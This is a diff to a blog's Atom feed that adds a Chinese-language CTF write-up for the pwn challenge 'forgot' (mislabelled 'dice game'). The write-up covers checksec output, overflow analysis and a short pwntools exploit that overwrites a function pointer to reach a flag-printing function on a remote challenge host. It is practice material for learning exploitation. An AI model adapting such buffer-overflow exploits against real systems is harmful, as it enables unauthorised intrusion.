@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-07-27T11:01:02.587Z</updated>
+  <updated>2019-07-27T11:09:30.760Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>dice game</title>
+    <link href="http://yoursite.com/2019/07/27/forgot/"/>
+    <id>http://yoursite.com/2019/07/27/forgot/</id>
+    <published>2019-07-27T11:02:27.671Z</published>
+    <updated>2019-07-27T11:09:30.760Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec forgot</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/forgot'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现有两处溢出点</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190708074419714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以观察到箭头处是个函数指针，&amp;v3 是v3在栈上的地址，&amp;v3 + --v14 是根据&amp;v3在栈上移动，上面的<span class="keyword">for</span>循环是用来改变v14的值，根据溢出点函数指针v3到v12 ，变量v14都可以被我们控制，接下来再找找有没有system函数</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190708075022550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现目标函数</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接下来我的想法是利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span><br><span class="line">v12，随后cat flag</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,39675)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x44 + p32(0x080486CC) + <span class="string">'a'</span>*0x20 + p32(0x8)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span></span><br><span class="line"><span class="comment">#v12，随后cat flag</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbb"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
+      
+    
+    </summary>
+    
+      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>warm up</title>
